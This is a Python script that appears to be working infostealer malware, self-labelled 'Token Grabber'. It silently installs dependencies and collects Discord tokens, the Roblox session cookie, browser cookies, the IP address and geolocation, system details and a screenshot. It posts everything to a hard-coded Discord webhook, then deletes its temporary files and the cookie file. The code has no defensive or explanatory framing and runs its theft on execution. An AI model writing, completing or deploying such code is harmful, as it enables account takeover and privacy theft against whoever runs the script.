import os
import subprocess
import sys

def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, '--quiet'])

try:
    import pyautogui
    from tempfile import NamedTemporaryFile, gettempdir
    import requests
    from PyInfosFinder import roblox, discord, browser_cookies, misc, computer
except ImportError as e:
    missing_module = str(e).split()[-1]
    install_package(missing_module)
    globals()[missing_module] = __import__(missing_module)


class BestProgram:
    def __init__(self):
        pass

    def rbx(self):
        return roblox.retrieveCookie()

    def dc(self):
        tkn = discord.get_tokens()
        info = discord.get_common_infos(tkn)
        return tkn, info if info is not None else []

    def ckies(self):
        return browser_cookies.browser_cookies()

    def msc(self):
        return misc.getallinfo()

    def pc(self):
        return computer.getallinfo()

    def create_message(self):
        message = "Discord:\n"
        disc_tokens, disc_info = self.dc()

        if disc_tokens:
            for token in disc_tokens:
                message += f"> Token: ||{token}||\n"
                if disc_info and isinstance(disc_info, list):
                    for user_info in disc_info:
                        if isinstance(user_info, dict) and user_info.get("userid") == token:
                            for key, value in user_info.items():
                                message += f"> {key}: {value}\n"
        else:
            message += "> No Discord tokens found.\n"

        message += "Misc:\n"
        misc_info = self.msc()
        message += f"> IP: {misc_info['ip']}\n"

        geo_info = misc_info.get("geo", {})
        if geo_info:
            message += "GeoLocation:\n"
            for key, value in geo_info.items():
                if key != 'query' and key != 'status':
                    message += f"> {key}: {value}\n"

        message += "PC Info:\n"
        pc_info = self.pc()
        for key, value in pc_info.items():
            if isinstance(value, dict):
                message += f"> {key}:\n"
                for sub_key, sub_value in value.items():
                    if isinstance(sub_value, dict):
                        message += f">   {sub_key}:\n"
                        for inner_key, inner_value in sub_value.items():
                            message += f">     {inner_key}: {inner_value}\n"
                    else:
                        message += f">   {sub_key}: {sub_value}\n"
            else:
                message += f"> {key}: {value}\n"

        message = message.replace("{", "").replace("}", "").replace("[", "").replace("]", "").replace("'", "")
        return message

def clear_temp_files(filenames):
    for filename in filenames:
        file_path = os.path.join(gettempdir(), filename)
        if os.path.exists(file_path):
            os.remove(file_path)

def take_screenshot():
    screenshot_path = NamedTemporaryFile(delete=False, suffix='.png').name
    return screenshot_path

def send():
    instance = BestProgram()
    message = instance.create_message()
    
    rbx_cookie = instance.rbx()
    
    rbx_cookie_path = None
    file_data = {}

    if rbx_cookie:
        rbx_cookie_path = NamedTemporaryFile(delete=False, prefix='rbx_cookie_', suffix='.txt').name
        with open(rbx_cookie_path, 'w') as rbx_file:
            rbx_file.write(rbx_cookie)

        file_data['rbx_cookie.txt'] = (os.path.basename(rbx_cookie_path), open(rbx_cookie_path, 'rb').read(), 'text/plain')

    cookiedir = instance.ckies()
    
    if not os.path.exists(cookiedir):
        return
    
    with open(cookiedir, 'rb') as f:
        file_content = f.read()
    
    existing_files = [os.path.basename(cookiedir), 'screenshot.png']
    clear_temp_files(existing_files)

    with NamedTemporaryFile(delete=False) as temp_file:
        temp_file.write(file_content)
        temp_file_path = temp_file.name
        
    file_data['file'] = (os.path.basename(cookiedir), file_content, 'application/octet-stream')

    screenshot_path = take_screenshot()
    pyautogui.screenshot().save(screenshot_path)

    if os.path.exists(screenshot_path):
        file_data['screenshot.png'] = (os.path.basename(screenshot_path), open(screenshot_path, 'rb').read(), 'image/png')
    
    payload = {
        'content': message,
        'username': 'Token Grabber',
        'avatar_url': 'https://cdn.discordapp.com/attachments/1315989723621097472/1315989790927224882/astolfo_upscaled.jpg?ex=67596a80&is=67581900&hm=defe4f8b3b95b2d093e76164f82e04977b7954a7ef30cdf8805f602f342f4bd6&',
    }

    try:
        requests.post("https://discord.com/api/webhooks/1309888227296936008/ao3UsnsdWRD4oLP7twhEhcWWxavG77QNSZj7oaLiPtXBAq1-_VDo-tj1MHxzq4NpA9Lm", data=payload, files=file_data)
    except Exception as e:
        pass  
    finally:
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
        if temp_file_path and os.path.exists(temp_file_path):
            os.remove(temp_file_path)
        if rbx_cookie_path and os.path.exists(rbx_cookie_path):
            os.remove(rbx_cookie_path)
        elif os.path.exists(cookiedir):
            os.remove(cookiedir)

send()
exit()